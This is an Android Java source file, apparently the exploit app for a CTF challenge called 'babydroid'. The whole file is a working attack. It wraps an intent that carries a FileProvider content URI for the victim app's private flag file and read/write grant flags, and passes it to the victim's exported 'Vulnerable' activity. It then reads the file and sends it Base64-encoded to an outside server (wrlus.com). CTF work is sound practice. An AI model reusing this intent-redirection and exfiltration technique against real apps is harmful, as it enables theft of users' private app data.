package com.bytectf.pwnbabydroid;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.StrictMode;
import android.util.Base64;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.Date;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

        requestServer("ping=onCreate&time=" + new Date().toString());

        String action = getIntent().getAction();

        if (action != null && action.equals("read_flag")) {
            requestServer("ping=beforeReadFlag&time=" + new Date().toString());

            Uri data = getIntent().getData();
            try {
                InputStream is = getContentResolver().openInputStream(data);
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                String flag = reader.readLine();
                requestServer("flag=" + Base64.encodeToString(flag.getBytes(), 0));
            } catch (Exception exc) {
                requestServer("ping=catchJavaException&exception="+
                        exc.getLocalizedMessage()+"&time=" + new Date().toString());
                exc.printStackTrace();
            }
        } else {
            String steal_flag = "content://androidx.core.content.FileProvider/" + "root/data/data/com.bytectf.babydroid/files/flag";
            Intent intent = new Intent(("read_flag"));
            intent.setClassName(getPackageName(), MainActivity.class.getName());
            intent.setData(Uri.parse(steal_flag));
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

            Intent wrapper = new Intent();
            wrapper.setClassName("com.bytectf.babydroid", "com.bytectf.babydroid.Vulnerable");
            wrapper.setAction("com.bytectf.TEST");
            wrapper.putExtra("intent", intent);

            requestServer("ping=beforeStartActivity&time=" + new Date().toString());

            startActivity(wrapper);
        }

        requestServer("ping=afterOnCreate&time=" + new Date().toString());
    }

    private void requestServer(String param) {
        try {
            String u = "http://wrlus.com/?" + param;
            URL url = new URL(u);
            URLConnection connection = url.openConnection();
            connection.setConnectTimeout(60000);
            connection.setReadTimeout(60000);
            connection.connect();
            BufferedReader uReader = new BufferedReader(
                    new InputStreamReader(connection.getInputStream()));

            uReader.readLine();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}